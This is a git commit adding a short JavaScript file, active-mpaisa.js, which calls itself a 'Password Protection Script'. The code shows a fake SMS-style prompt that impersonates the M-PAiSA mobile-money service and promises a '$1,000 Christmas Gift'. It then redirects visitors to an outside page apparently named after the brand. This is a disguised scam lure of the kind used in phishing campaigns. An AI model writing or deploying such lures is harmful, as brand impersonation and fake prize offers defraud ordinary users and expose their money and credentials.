13124f561a31b67fb821daba497b1b01c6716dd9
itidnewblog4 <ukpehaitid2@gmail.com>
2025-12-06 14:21:15 +0100

    Create active-mpaisa.js

---
+++ active-mpaisa.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'GET $1,000 GIFT'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive the $1,000 Christmas Gift from M-PAiSA. Please press OK to get Gift now.',
+  'GET $1,000 GIFT'
+);
+if (password != 'GET $1,000 GIFT') {
+  location.href = 'https://phlug.org/m-paisa.html';
+}
